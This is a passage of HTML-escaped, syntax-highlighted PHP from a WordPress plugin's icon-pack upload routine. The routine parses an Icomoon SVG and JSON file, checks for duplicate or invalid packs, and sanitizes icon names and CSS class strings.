class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_wp_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$json&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$json&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Load&amp;ensp;and&amp;ensp;parse&amp;ensp;the&amp;ensp;SVG&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$xml&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;simplexml_load_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$font_attr&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$xml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;defs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;font&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;attributes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$glyphs&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$xml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;defs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;font&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;children&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Sanitize&amp;ensp;the&amp;ensp;font&amp;ensp;name&amp;ensp;(ip_name)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$font_attr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$font_folder&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fontdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$font_folder&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;delete_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;There&amp;ensp;is&amp;ensp;already&amp;ensp;an&amp;ensp;Icon&amp;ensp;Pack&amp;ensp;with&amp;ensp;this&amp;ensp;name.&amp;ensp;Please&amp;ensp;upload&amp;ensp;with&amp;ensp;another&amp;ensp;name.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;borderless&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Decode&amp;ensp;JSON&amp;ensp;content&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_contents&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$json&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_contents&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;IcoMoonType&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;delete_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;This&amp;ensp;Icon&amp;ensp;Pack&amp;ensp;is&amp;ensp;not&amp;ensp;an&amp;ensp;Icomoon&amp;ensp;pack.&amp;ensp;Use&amp;ensp;only&amp;ensp;Icomoon&amp;ensp;Icon&amp;ensp;Pack&amp;ensp;files.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Iterate&amp;ensp;over&amp;ensp;icons&amp;ensp;to&amp;ensp;build&amp;ensp;$this-&amp;gt;json_config&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icons&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_contents&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;icons&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icons&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Sanitize&amp;ensp;each&amp;ensp;piece&amp;ensp;of&amp;ensp;data&amp;ensp;to&amp;ensp;prevent&amp;ensp;injection&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$raw_name&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;properties&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;properties&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;unknown&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon_name&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$raw_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Create&amp;ensp;a&amp;ensp;&amp;#34;class&amp;#34;&amp;ensp;by&amp;ensp;removing&amp;ensp;spaces&amp;ensp;and&amp;ensp;sanitizing&amp;ensp;further&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon_class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;ensp;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Remove&amp;ensp;any&amp;ensp;other&amp;ensp;characters&amp;ensp;that&amp;ensp;are&amp;ensp;not&amp;ensp;typical&amp;ensp;in&amp;ensp;a&amp;ensp;CSS&amp;ensp;class&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon_class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[^A-Za-z0-9\-_]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon_class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$raw_tags&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;icon&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;tags&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;icon&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;tags&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span 